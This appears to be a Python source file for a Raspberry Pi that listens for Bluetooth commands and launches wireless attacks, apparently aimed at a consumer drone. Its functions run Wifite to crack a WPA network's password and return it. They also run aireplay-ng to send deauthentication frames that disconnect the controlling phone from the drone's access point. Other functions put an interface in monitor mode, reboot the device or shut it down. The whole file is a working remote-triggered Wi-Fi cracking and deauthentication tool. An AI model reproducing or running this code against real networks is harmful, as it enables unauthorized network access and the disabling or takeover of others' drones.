"""Ddrone bluetooth functionality.

Sets up bluetooth server to listen and respond to text commands
"""

import os
import time
from bluetooth import *
from subprocess import Popen, PIPE, STDOUT
import json
import re

""" import glob """
""" import signal """
""" import logging """

""" /dev/null output when needed """
DN = open(os.devnull, 'w')

""" Bluetooth communication process idea

    Send the process id on start of process back to Androi so that
    if it needs to it can send a command back to kill the process
    or choose to await for the process to finish

    Set session id to each process
    Popen(preexec_fn=os.setsid)

    To kill a subprocess and all it's children
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # Send the signal to all the process groups
"""


def print_message(msg):
    """ Formatted message that needs to stand out """
    print '------------------------------------------'
    print '            %s' % str(msg)
    print '------------------------------------------'


def remove_ansi_formatting(ansiText):
    """ Remove any ansi color characters from wifite """
    ansi_escape = re.compile(r'\x1b[^m]*m')
    return ansi_escape.sub('', ansiText)


def main():

    """ Setup Bluetooth server"""
    server_sock = BluetoothSocket(RFCOMM)
    server_sock.bind(('', PORT_ANY))
    server_sock.listen(1)

    """ MESSAGE_DELIMITER = '--' """
    END_MESSAGE = '!'

    port = server_sock.getsockname()[1]

    uuid = '94f39d29-7d6d-437d-973b-fba39e49d4ee'

    advertise_service(
        server_sock,
        'ddrone-rfcomm-server',
        service_id=uuid,
        service_classes=[uuid, SERIAL_PORT_CLASS],
        profiles=[SERIAL_PORT_PROFILE]
    )

    """ Main Bluetooth server loop """
    while True:

        print 'Waiting for connection on RFCOMM channel %d' % port

        client_sock, client_info = server_sock.accept()
        print 'Accepted connection from ', client_info

        try:
            received_data = client_sock.recv(1024)
            # received_data = 'START_CRACK' + MESSAGE_DELIMITER + '<MAC_ADDRESS_HERE> MESSAGE_DELIMITER + END_MESSAGE
            sent_data = 'INVALID_RESPONSE'
            if len(received_data) == 0: break
            print 'received [%s]' % received_data

            """ Check for TESTING first format: TESTING--CMD_STRING """
            if 'TESTING' in received_data:
                if 'WAKE_SCREEN' in received_data:
                    sent_data = wake_up_screen()
            else:
                """ All non-testing commands """
                if 'REBOOT' in received_data:
                    sent_data = reboot_pi()

                if 'SHUTDOWN' in received_data:
                    sent_data = shutdown_pi()

                elif 'START_CRACK' in received_data:

                    print 'String has start crack ' + received_data
                    return_string = start_crack(received_data)
                    print 'String to return through bluetooth ' + return_string
                    sent_data = return_string

                elif 'GET_PSK' in received_data:
                    sent_data = get_psk()

                elif 'START_DEAUTH' in received_data:
                    """Start deauth on contoller_phone_mac with wlan1mon"""
                    # mac_address = received_data.split('--')[1] # example parsing
                    drone_controller_mac = received_data.split('--')[1]  # ''  # Phantom_Ddrone (access point)
                    controller_phone_mac = received_data.split('--')[2]  # ''  # Phone controlling drone (client)

                    sent_data = start_deauth(drone_controller_mac, controller_phone_mac)

                elif 'STOP_DEAUTH' in received_data:
                    """Stop deauth wlan1mon"""

                    """ NOT CREATED YET """
                    sent_data = 'NOT_CREATED'
                    """sent_data = stop_deauth(drone_controller_mac, controller_phone_mac) """
                elif 'START_MONITOR_MODE' in received_data:
                    """Turn monitor mode of wlan1 on to be wlan1mon"""
                    sent_data = monitor_mode_on()
                elif 'STOP_MONITOR_MODE' in received_data:
                    """Turn monitor mode of wlan1 on to be wlan1mon"""
                    sent_data = monitor_mode_off()

                else:
                    sent_data = 'BIG_NONO'

            sent_data += END_MESSAGE

            """ Send the response with the delimiter """
            try:
                client_sock.send(sent_data)
            except btcommon.BluetoothError as e:
                print e
            except Exception as e:
                print e

            print 'sending [%s]' % sent_data

        except KeyboardInterrupt:

            print 'disconnected'

            client_sock.close()
            server_sock.close()
            print 'all done'

            break


def parse_mac_address(received_data):
    """
        Pull out the MAC address from any input in
        the form 'SOME_ACTION--MM:MM:MM:SS:SS:SS--!'
    """
    print_message('Parse out MAC address (BSSID) from %s ' % (received_data))
    return received_data.split('--')[1]


def reboot_pi():
    """Sends a reboot signal to the Pi"""
    name = 'reboot_pi'
    cmd = [
        'sudo',
        'reboot',
        'now'
    ]
    Popen(cmd, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid)
    return 'Rebooting Pi...'


def shutdown_pi():
    """Sends a reboot signal to the Pi"""
    name = 'shutdown_pi'
    cmd = ['sudo', 'shutdown', 'now']
    Popen(cmd, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid)
    return 'Shutting down Pi...'


def start_crack(received_data):
    """
        Cracks a network

        THIS WILL BE THE FINAL IMPLEMENTATION OF
        START CRACK ONCE OTHER IMPLEMENTATIONS ARE
        COMBINED

        Currently uses proc.communicate to wait until
        a process is complete
    """

    name = 'start_crack'
    crack_success = False
    client_to_deauth = ''
    password = 'INVALID_RESPONSE'

    """Parse the received_data to pull out the mac"""
    mac_address = parse_mac_address(received_data)

    """ Time the process (proc) """
    start = time.time()

    """ Let user know crack has started """
    print_message('Now cracking network with BSSID %s ...' % (mac_address))

    """ TODO: pass essid to wifite"""
    cmd = [
        'sudo',
        'python',
        '/home/pi/ddrone-pi/wifite2/Wifite.py',
        '-b',  # BSSID
        mac_address,
        '-e',  # ESSID Network Name
        'Phantom_Ddrone',
        '--num-deauths',  # Number of deauths to send for all commands
        '4',
        '--verbose',
        '--wpa',  # only target WPA
        '--wpat',  # time to wait for WPA attack to complete [seconds] (default 500)
        '700',  # over a half hour
        '--wpadt',  # Time to wait between sending deauths [seconds] (default 15)
        '30',
        '-i',  # wireless interface for capturing
        'wlan1mon'
    ]

    """ Create timestamp for logfile """
    t_str = time.strftime("%d-%b-%Y_%H:%M:%S", time.localtime())

    """ Create logfile """
    out_file = open('/home/pi/output-files/output-' + t_str + '.txt', 'w+')

    first_line = 'First line in file \n %s' % t_str
    out_file.write(first_line)

    """ Create cracking proc """
    proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, preexec_fn=os.setsid)  # , bufsize=1)

    """ Get proc id in case it needs to be terminated """
    proc_id = os.getpgid(proc.pid)
    proc_line = '[%s] Process id: %d \n' % (name, proc_id)
    print proc_line
    out_file.write(proc_line)

    """ TODO:   Possibly have the stages of cracking broken into chunks
                so that updates can be sent during the process
    """

    client_found = False
    client_mac_address = ''

    """ Live print format
        NOTE: also need bufsize=1 as param in Popen

        with proc.stdout:
            for line in iter(proc.stdout.readline, b''):

                ALL THE SAME STUFF GOES HERE

                sometimes got stuck on
                'analysis of captured handshake file'
        proc.wait()
    """

    for line in proc.communicate()[0].split('\n'):
        if line == '' or line == None: continue

        """ Check if crack succeeded """
        uncolored_line = remove_ansi_formatting(line)
        uncolored_line = uncolored_line.replace('stty: standard input: Inappropriate ioctl for device', '')
        if uncolored_line.find('saved crack result to cracked.txt'):
            crack_success = True

        formatted_line = '[DKE - %s - %s] %s  \n' % (name, t_str, uncolored_line)

        """ Gather strings to output to log file """
        out_file.write(formatted_line)

        print formatted_line
        """ Check for client mac address to later deauth """
        if not client_found:
            if line.find('Discovered new client:') != -1:

                client_to_deauth = line.split(' ')

                for item in client_to_deauth:
                    num_semicolons = 0
                    if '(' not in item:

                        for char in item:
                            if char == ':':
                                num_semicolons = num_semicolons + 1
                        if num_semicolons == 5:
                            """ Make sure it's not the drone client """
                            if '60:60:1F' not in item:
                                client_mac_address = remove_ansi_formatting(item)
                                client_found = True
                                print_message('The client mac address is ' + client_mac_address + ' without ansi formatting and ' + item + ' with it.')

    """ Write out time cracking took to finish """
    end = time.time()
    time_elapsed = end - start
    time_line = '[DKE] Took %d s to run \n' % time_elapsed
    out_file.write(time_line)
    print time_line

    """ Attempt to get the password from the file created after the crack """
    try:
        with open('/home/pi/ddrone-pi/cracked.txt') as json_data:
            crack_data = json.load(json_data)
            length = len(crack_data)
            password = crack_data[length - 1]['key']
            json_data.close()
    except IOError as e:
        print e

    print 'Done writing to log file \n crack_success is %s \n' % (str(crack_success))
    print '[DKE] about to return the password %s' % password

    """ Create return string and send """
    return_string = ''
    if crack_success is True:
        return_string = 'CRACK_SUCCESS--%s--%s--' % (password, client_mac_address)
    else:
        return_string = 'CRACK_FAILURE--%s--%s--' % (password, client_mac_address)

    print '[DKE] about to close the output files'

    return_string_line = '[DKE] return_string %s \n' % return_string

    out_file.write(return_string_line)

    out_file.close()

    return return_string


def start_deauth(drone_controller_mac='', controller_phone_mac=''):
    """Initiate deauthentication attack on specified target"""

    """ aireplay-ng --deauth <number to deauth packets to sent> -a <phantom mac address access point> -c <client mac> <interface>
        -0 or --deauth is deauthentication attack
        0 means continuously send deauth
        -a is access point
        -c is connected client
        wlan1mon is the interface
    """

    """ TODO: programatically find the interface to put in monitor mode """

    name = 'start_deauth'
    deauth_count = '200'

    cmd_start_deauth = [
        'sudo',
        'aireplay-ng',
        '--deauth',
        deauth_count,
        '-a',
        drone_controller_mac,
        '-c',
        controller_phone_mac,
        'wlan1mon'
    ]
    print_message('Running command:    ' + name)

    """ Create proc """
    proc_start_deauth = Popen(cmd_start_deauth, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid, bufsize=1)

    """ Get and print proc id that could be used to kill it and all child proc's """
    proc_start_deauth_id = os.getpgid(proc_start_deauth.pid)
    print '[%s] Process id: %d' % (name, proc_start_deauth_id)

    with proc_start_deauth.stdout:
        for line in iter(proc_start_deauth.stdout.readline, b''):
            print '[ %s ] %s' % (name, line)
    proc_start_deauth.wait()

    return 'START_DEAUTH--SUCCESS'


def stop_deauth(drone_controller_mac='', controller_phone_mac=''):
    """ Terminate deauthentication attack """

    """ Right now start_deauth just sends 50 deauth packets
        but it would continuously send them if the -0
        option was given to the --deauth flag.

        That would hold up the BT server though so it would
        have to be run in the background and have the process
        terminated with

        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    """

    return 'STOP_DEAUTH--SUCCESS'


def monitor_mode_on():
    """ Wake up the console on a pi with hdmi plugged in """

    name = 'monitor_mode_on'

    cmd_check_kill = [
        'sudo',
        'airmon-ng',
        'check',
        'kill'
    ]
    """ Create proc to kill anything that gets in the way of airmon-ng """
    proc_check_kill = Popen(cmd_check_kill, stdout=PIPE, preexec_fn=os.setsid, bufsize=1)

    with proc_check_kill.stdout:
        for line in iter(proc_check_kill.stdout.readline, b''):
            print '[ %s ] %s' % (name, line)
    proc_check_kill.wait()

    cmd_start_mon_mode = [
        'sudo',
        'airmon-ng',
        'start',
        'wlan1',
        '6'
    ]

    """ Create proc to start monitor mode """
    proc_start_mon_mode = Popen(cmd_start_mon_mode, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid, bufsize=1)

    with proc_start_mon_mode.stdout:
        for line in iter(proc_start_mon_mode.stdout.readline, b''):
            print '[ %s ] %s' % (name, line)
    proc_start_mon_mode.wait()

    return 'MONITOR_MODE_ON--SUCCESS'


def monitor_mode_off():
    """ Wake up the console on a pi with hdmi plugged in """
    name = 'monitor_mode_off'

    """ Maybe add in these to restart the interfaces if needed """
    # cmd = 'sudo ifdown wlan0 && sudo ifup wlan0 && sudo ifdown wlan1 && sudo ifup wlan1'

    cmd = [
        'sudo',
        'airmon-ng',
        'stop',
        'wlan1mon'
    ]

    """ Create proc """
    proc_stop_mon_mode = Popen(cmd, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid, bufsize=1)

    """ Live print the output """
    with proc_stop_mon_mode.stdout:
        for line in iter(proc_stop_mon_mode.stdout.readline, b''):
            print '[ %s ] %s' % (name, line)

    """ Wait for completion before returning """
    proc_stop_mon_mode.wait()

    return 'MONITOR_MODE_OFF--SUCCESS'


def wake_up_screen():
    """ Wake up the console on a pi with hdmi plugged in """

    name = 'wake_up_screen'
    start = time.time()

    cmd = 'sudo bash -c \'echo -ne "\033[9;0]" > /dev/tty1\''

    """ Create proc and wait for it to finish """
    Popen(cmd, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid, shell=True).wait()

    end = time.time()
    time_elapsed = end - start

    print '[%s] %d s to run' % (name, time_elapsed)

    return 'WAKE_SCREEN--SUCCESS'

if __name__ == '__main__':
    main()

""" System that would manage basic state (10/29/2017)

    def print_state(state={}):
        print state.items()


    def init_state():
        state = {
            'crack_success': False,
            'cracked_psk': '',
            'client_phone_bssid': '',
            'is_in_mon_mode': False
        }
        return state


    def update_state(actionDict, state={}):
        # Check if state has been initialized, init if it hasen't been
        if 'crack_success' not in state:
            print 'State not initialized, initializing'
            state = init_state()

        new_state = state.copy()
        if action_dict.key in new_state:
            print 'Updating key %s from %s to %s' % (str(action_dict.key), str(state[action_dict.key]), str(action_dict.value))
            stateCopy[action_dict.key] = action_dict.value
            return new_state
        else:
            print 'New key %s is not in state, returning state' % (str(actionDict.key))
            return state
"""


"""Possibly send logfiles to an email for debugging (10/27/17)

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText

    MY_ADDRESS = 'my_address@example.comm'
    PASSWORD = 'mypassword'

    # set up the SMTP server
    s = smtplib.SMTP(host='your_host_address_here', port=your_port_here)
    s.starttls()
    s.login(MY_ADDRESS, PASSWORD)
"""
